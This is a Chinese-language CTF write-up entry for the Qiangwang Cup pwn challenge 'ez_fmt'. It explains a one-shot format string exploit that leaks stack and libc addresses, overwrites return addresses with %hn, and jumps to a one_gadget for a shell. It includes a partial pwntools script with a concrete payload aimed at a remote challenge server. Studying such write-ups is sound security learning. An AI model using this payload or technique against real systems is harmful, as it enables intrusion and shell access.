# ez_fmt

> 分类：Pwn（强网先锋）

## 题目描述

格式化字符串漏洞，只能利用一次。先泄露栈地址，覆盖 printf 返回地址实现多次利用，再劫持 main 返回地址为 one_gadget。

## 考察知识点

- 格式化字符串漏洞（%hn / %hhn）
- 栈地址泄露
- 覆盖返回地址 + one_gadget

## 解法

1. 程序泄露栈地址，用 `%hn` 把 printf 返回地址覆盖，泄露 libc（`%19$p`）。
2. 计算 libc 基址和 one_gadget，二次利用格式化字符串把 main 返回地址覆盖为 one_gadget。

```python
from pwn import *
p = remote("47.104.24.40", 1337)
p.recvuntil("There is a gift for you ")
stack = int(p.recvline(), 16)
# 第一次：泄露 libc 并覆盖 printf 返回地址
payload = b'%4507c%10$hn#%19$p'.ljust(0x20, b'\0') + p64(stack - 8)
p.send(payload)
# 第二次：写 one_gadget
```

## 参考答案

（flag 通过 one_gadget getshell 读取）

## 来源

- 作者：m1ao | https://xz.aliyun.com/news/12701
- 作者：星盟安全团队 | https://blog.xmcve.com/2023/12/18/强网杯2023-Writeup/
- https://cn-sec.com/archives/2314955.html
